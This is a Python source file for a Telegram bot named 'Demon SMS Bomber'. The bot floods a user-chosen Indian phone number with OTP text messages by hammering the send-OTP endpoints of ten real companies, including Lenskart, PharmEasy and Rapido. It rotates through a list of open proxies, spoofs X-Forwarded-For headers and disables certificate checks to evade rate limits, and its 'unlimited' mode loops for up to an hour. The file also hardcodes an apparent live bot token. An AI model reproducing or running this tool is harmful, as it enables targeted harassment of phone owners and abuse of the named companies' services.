import telebot
import requests
import time
import json
import os
import random
import threading
from datetime import datetime, timedelta
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import hashlib
from flask import Flask

# ─── FLASK SERVER SETUP FOR RENDER ──────────────────────────────
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running live on Render!"

def run_flask():
    # Render PORT environment variable automatically provide karta hai
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ╔══════════════════════════════════════════════════════════════════╗
# ║         𝐃𝐄𝐌𝐎𝐍 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 — FREE EDITION                     ║
# ║         🇮🇳 200+ INDIA SMS + 🔥 UNLIMITED BOMB                ║
# ╚══════════════════════════════════════════════════════════════════╝

BOT_TOKEN       = "8938130401:AAEzEIrsax94hyrqZHebHjJQgNXFlL9vWfY"
bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
BOT_USERNAME    = "@bomfhjbot"

# ─── PROXY LIST (FULL 200+ PROXIES) ──────────────────────────────
PROXY_LIST = [
    "1.0.136.129:8080", "1.0.170.50:8080", "1.1.109.141:9999",
    "1.1.189.58:8080", "1.1.220.100:8080", "1.10.141.115:8080",
    "1.10.146.76:3128", "1.117.83.95:80", "1.179.147.5:52210",
    "1.179.148.33:1080", "1.179.148.9:36476", "1.179.148.9:55636",
    "1.179.172.45:31225", "1.179.199.130:33333", "1.179.231.130:8080",
    "1.180.0.162:7302", "1.180.49.222:7302", "1.2.252.65:8080",
    "1.20.169.102:8080", "1.212.157.114:4145", "1.234.153.14:80",
    "1.4.198.167:8080", "1.52.198.150:16000", "1.52.198.221:16000",
    "1.54.172.229:16000", "1.9.167.35:60489", "100.1.53.24:5678",
    "100.27.183.62:8080", "101.108.112.243:8080", "101.108.113.83:8080",
    "101.109.107.206:8080", "101.109.119.24:8080", "101.109.217.20:8080",
    "101.109.245.200:4153", "101.109.76.109:4145", "101.128.107.36:1111",
    "101.128.93.144:8090", "101.2.161.118:8080", "101.200.241.24:3128",
    "101.251.204.174:8080", "101.255.106.94:8080", "101.255.107.118:8080",
    "101.255.119.206:8080", "101.255.119.26:8080", "101.255.137.49:80",
    "101.255.138.82:80", "101.255.148.2:8080", "101.255.150.238:1080",
    "101.255.158.78:1111", "101.255.166.134:1111", "101.255.208.18:8090",
    "101.255.208.62:8080", "101.255.210.1:1111", "101.255.210.1:11116",
    "101.255.211.42:1111", "101.255.211.54:8082", "101.255.32.42:8080",
    "101.255.53.105:8080", "101.255.69.26:8080", "101.32.34.4:8118",
    "101.47.16.15:7890", "101.51.121.29:4153", "101.51.138.138:8080",
    "101.91.242.198:6688", "102.0.0.118:80", "102.0.16.226:8080",
    "102.0.17.164:8080", "102.0.18.120:8080", "102.0.18.198:8080",
    "102.0.21.156:8080", "102.0.8.23:8080", "102.0.9.114:8080",
    "102.135.142.234:12354", "102.135.195.90:8082", "102.141.30.2:33333",
    "102.164.215.88:8080", "102.164.220.243:8080", "102.164.252.150:8080",
    "102.165.125.102:5678", "102.177.176.0:80", "102.177.176.100:80"
]

_proxy_idx   = 0
_proxy_lock  = threading.Lock()
_dead_proxies = set()

def get_proxy():
    global _proxy_idx
    if not PROXY_LIST:
        return None
    with _proxy_lock:
        tried = 0
        while tried < len(PROXY_LIST):
            p = PROXY_LIST[_proxy_idx % len(PROXY_LIST)]
            _proxy_idx += 1
            tried += 1
            if p not in _dead_proxies:
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

# ─── DATABASE ──────────────────────────────────────────────────────
DB_DIR = "db"
os.makedirs(DB_DIR, exist_ok=True)

def load_db(name, default):
    path = f"{DB_DIR}/{name}.json"
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f)
    with open(path, "r") as f:
        return json.load(f)

def save_db(name, data):
    with open(f"{DB_DIR}/{name}.json", "w") as f:
        json.dump(data, f, indent=2)

users       = load_db("users", {})
attack_logs = load_db("attack_logs", {})

# ─── 🇮🇳 INDIA SMS APIS ──────────────────────────────────────────
INDIA_SMS_APIS = [
    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "Rapido",          "url": "https://customer.rapido.bike/api/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'}
]

# ─── UTILITY FUNCTIONS ────────────────────────────────────────────

def add_footer(text):
    if FOOTER not in text:
        text += FOOTER
    return text

def call_api_safe(api, phone):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Accept":          "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}."
                           f"{random.randint(1,254)}.{random.randint(1,254)}",
    }
    if api.get("headers"):
        headers.update(api["headers"])

    url = api["url"](phone) if callable(api["url"]) else api["url"]
    raw = api["data"](phone) if callable(api.get("data")) else api.get("data", "")

    def _do_request(proxy_dict):
        if api["method"] == "POST":
            return requests.post(url, data=raw, headers=headers,
                                 proxies=proxy_dict, timeout=6, verify=False)
        else:
            return requests.get(url, headers=headers,
                                proxies=proxy_dict, timeout=6, verify=False)

    proxy = get_proxy()
    if proxy:
        proxy_ip = proxy["http"].replace("http://", "")
        try:
            resp = _do_request(proxy)
            return resp.status_code in [200, 201, 202]
        except Exception:
            _dead_proxies.add(proxy_ip)

    try:
        resp = _do_request(None)
        return resp.status_code in [200, 201, 202]
    except Exception:
        return False

def format_time(seconds):
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    if h: return f"{h}h {m}m {s}s"
    if m: return f"{m}m {s}s"
    return f"{s}s"

# ─── KEYBOARD BUILDERS ────────────────────────────────────────────

def main_menu_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.row("🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
    kb.row("🔥 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐁𝐨𝐦𝒃")
    kb.row("📊 𝐁𝐨𝐦𝐛𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬", "📈 𝐌𝐲 𝐒𝐭𝐚𝐭𝐬")
    kb.row("ℹ️ 𝐇𝐞𝐥𝐩 & 𝐆𝐮𝐢𝐝𝐞")
    return kb

def tier_inline_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💣 Normal (100 SMS)", callback_data="tier_normal"),
        InlineKeyboardButton("⚡ Premium (200 SMS)", callback_data="tier_premium"),
        InlineKeyboardButton(f"☢️ Nuclear ({len(INDIA_SMS_APIS)} SMS)", callback_data="tier_nuclear"),
        InlineKeyboardButton("❌ Cancel", callback_data="tier_cancel")
    )
    return kb

# ─── /start COMMAND ──────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def start_command(message):
    uid = str(message.from_user.id)

    if uid not in users:
        users[uid] = {
            "username":    message.from_user.username or "N/A",
            "first_name":  message.from_user.first_name or "User",
            "joined":      time.time(),
            "total_bombs": 0,
            "total_sms":   0,
        }
        save_db("users", users)

    bot.send_message(message.chat.id, add_footer(
        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
        "<b>💥 𝐃𝐄𝐌𝐎𝐍 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 (FREE) 💥</b>\n"
        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"👋 <b>Welcome, {message.from_user.first_name}!</b>\n"
        "🎉 <b>Status: 100% Free Unlimited Access</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "Use the menu below to start bombing!"
    ), reply_markup=main_menu_keyboard())

# ─── 🇮🇳 INDIA SMS BOMBER ─────────────────────────────────────────

@bot.message_handler(func=lambda m: m.text == "🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
def india_sms_handler(message):
    uid = str(message.from_user.id)

    attack_logs[uid] = {"country": "india_sms"}
    save_db("attack_logs", attack_logs)

    bot.send_message(message.chat.id, add_footer(
        "🇮🇳 <b>INDIA SMS BOMBER</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"📡 <b>APIs:</b> <code>{len(INDIA_SMS_APIS)}</code>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "⬇️ Select attack tier:"
    ), reply_markup=tier_inline_keyboard())

@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("tier_"))
def tier_callback(call):
    uid = str(call.from_user.id)
    data = call.data
    if data == "tier_cancel":
        attack_logs.pop(uid, None)
        save_db("attack_logs", attack_logs)
        bot.answer_callback_query(call.id, "❌ Cancelled")
        bot.edit_message_text(add_footer("❌ <b>Cancelled.</b>"), call.message.chat.id, call.message.message_id, reply_markup=None)
        return

    tier_map = {"tier_normal": "normal", "tier_premium": "premium", "tier_nuclear": "nuclear"}
    attack_logs[uid] = attack_logs.get(uid, {})
    attack_logs[uid]["tier"] = tier_map.get(data, "normal")
    save_db("attack_logs", attack_logs)

    bot.answer_callback_query(call.id, f"✅ {data.split('_')[1].upper()} tier selected")
    msg = bot.send_message(call.message.chat.id, add_footer(
        "📱 <b>Enter Indian Mobile Number</b>\nFormat: <code>9876543210</code>"
    ))
    bot.register_next_step_handler(msg, process_phone_number)

def process_phone_number(message):
    uid = str(message.from_user.id)
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, add_footer("❌ <b>Invalid!</b> Exactly 10 digits needed."), reply_markup=main_menu_keyboard())
        return

    attack_logs[uid]["phone"] = phone
    attack_logs[uid]["display"] = "+91 " + phone
    save_db("attack_logs", attack_logs)

    tier = attack_logs[uid].get("tier", "normal")
    cnt = 200 if tier == "premium" else len(INDIA_SMS_APIS) if tier == "nuclear" else 100

    msg = bot.send_message(message.chat.id, add_footer(
        "⚠️ <b>CONFIRM ATTACK</b>\n"
        f"🎯 Target: <code>+91 {phone}</code>\n"
        f"📨 SMS: <code>{cnt}</code>\n"
        "Reply <code>CONFIRM</code> to launch 🚀"
    ))
    bot.register_next_step_handler(msg, handle_attack_confirmation)

def handle_attack_confirmation(message):
    uid = str(message.from_user.id)
    if not message.text or message.text.upper() != "CONFIRM":
        bot.send_message(message.chat.id, add_footer("❌ <b>Aborted.</b>"), reply_markup=main_menu_keyboard())
        return

    tier = attack_logs[uid].get("tier", "normal")
    phone = attack_logs[uid]["phone"]
    display = attack_logs[uid]["display"]

    lm = bot.send_message(message.chat.id, add_footer("⚡ <b>INITIALIZING ATTACK...</b>"), reply_markup=main_menu_keyboard())

    threading.Thread(
        target=execute_attack,
        args=(uid, message.chat.id, tier, phone, display, lm.message_id),
        daemon=True
    ).start()

def execute_attack(uid, chat_id, tier, phone, display, msg_id):
    pool = INDIA_SMS_APIS[:]
    random.shuffle(pool)
    ok = bad = 0
    t0 = time.time()

    for api in pool:
        if call_api_safe(api, phone):
            ok += 1
        else:
            bad += 1

    elapsed = time.time() - t0
    bot.edit_message_text(
        chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
        text=add_footer(
            "🏆 <b>ATTACK REPORT</b>\n"
            f"🎯 Target: <code>{display}</code>\n"
            f"✅ Successful: <code>{ok}</code>\n"
            f"❌ Failed: <code>{bad}</code>\n"
            f"⏱ Duration: <code>{elapsed:.1f}s</code>"
        )
    )

    if str(uid) in users:
        users[str(uid)]["total_bombs"] = users[str(uid)].get("total_bombs", 0) + 1
        users[str(uid)]["total_sms"] = users[str(uid)].get("total_sms", 0) + (ok + bad)
        save_db("users", users)

# ─── 🔥 UNLIMITED BOMB ────────────────────────────────────────────

@bot.message_handler(func=lambda m: m.text == "🔥 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐁𝐨𝐦𝒃")
def unlimited_bomb_handler(message):
    uid = str(message.from_user.id)
    attack_logs[uid] = {"mode": "unlimited"}
    save_db("attack_logs", attack_logs)

    msg = bot.send_message(message.chat.id, add_footer(
        "🔥 <b>UNLIMITED BOMB</b>\n"
        "⏱ <b>Enter duration in minutes (1–60):</b>"
    ))
    bot.register_next_step_handler(msg, process_unlimited_duration)

def process_unlimited_duration(message):
    uid = str(message.from_user.id)
    try:
        minutes = int(message.text.strip())
        if minutes < 1 or minutes > 60:
            raise ValueError
    except Exception:
        bot.send_message(message.chat.id, add_footer("❌ Enter a valid number (1-60)."), reply_markup=main_menu_keyboard())
        return

    attack_logs[uid]["duration_min"] = minutes
    save_db("attack_logs", attack_logs)

    msg = bot.send_message(message.chat.id, add_footer("📱 <b>Enter Indian Mobile Number:</b>"))
    bot.register_next_step_handler(msg, process_unlimited_phone)

def process_unlimited_phone(message):
    uid = str(message.from_user.id)
    phone = ''.join(filter(str.isdigit, message.text or ""))
    if len(phone) != 10:
        bot.send_message(message.chat.id, add_footer("❌ Invalid phone number."), reply_markup=main_menu_keyboard())
        return

    minutes = attack_logs[uid]["duration_min"]
    display = "+91 " + phone

    lm = bot.send_message(message.chat.id, add_footer("🔥 <b>UNLIMITED BOMB LAUNCHING...</b>"), reply_markup=main_menu_keyboard())

    threading.Thread(
        target=execute_unlimited_attack,
        args=(uid, message.chat.id, phone, display, minutes, lm.message_id),
        daemon=True
    ).start()

def execute_unlimited_attack(uid, chat_id, phone, display, minutes, msg_id):
    end_time = time.time() + (minutes * 60)
    total_hit = total_mis = 0

    while time.time() < end_time:
        for api in INDIA_SMS_APIS:
            if time.time() >= end_time: break
            if call_api_safe(api, phone): total_hit += 1
            else: total_mis += 1

    bot.edit_message_text(
        chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
        text=add_footer(
            "🏆 <b>UNLIMITED BOMB REPORT</b>\n"
            f"🎯 Target: <code>{display}</code>\n"
            f"✅ Successful: <code>{total_hit}</code>\n"
            f"❌ Failed: <code>{total_mis}</code>"
        )
    )

# ─── STATS & HELP ──────────────────────────────────────────

@bot.message_handler(func=lambda m: m.text == "📈 𝐌𝐲 𝐒𝐭𝐚𝐭𝐬")
def stats_handler(message):
    uid = str(message.from_user.id)
    ud = users.get(uid, {})
    bot.send_message(message.chat.id, add_footer(
        "📈 <b>YOUR STATS</b>\n"
        f"🎯 Total Attacks: <code>{ud.get('total_bombs', 0)}</code>\n"
        f"📨 Total SMS: <code>{ud.get('total_sms', 0)}</code>"
    ))

@bot.message_handler(func=lambda m: m.text == "📊 𝐁𝐨𝐦𝐛𝐞𝐫 𝐒𝐭𝐚𝐭𝐬")
def bomber_status_handler(message):
    bot.send_message(message.chat.id, add_footer(
        "📊 <b>SYSTEM STATUS</b>\n"
        "🟢 Status: <b>Free Unlimited Access Mode Active</b>\n"
        f"🇮🇳 APIs Loaded: <code>{len(INDIA_SMS_APIS)}</code>"
    ))

@bot.message_handler(func=lambda m: m.text == "ℹ️ 𝐇𝐞𝐥𝐩 & 𝐆𝐮𝐢𝐝𝐞")
def help_handler(message):
    bot.send_message(message.chat.id, add_footer(
        "ℹ️ <b>HELP & GUIDE</b>\n"
        "This bot is completely free for all users.\n"
        "No admin access, no channels to join, no credits system."
    ))

# ─── START BOT AND FLASK SERVER ─────────────────────────────────
if __name__ == "__main__":
    # Flask app ko background thread me chalana
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    print("Flask Web Server & Telegram Bot are running...")
    bot.infinity_polling()

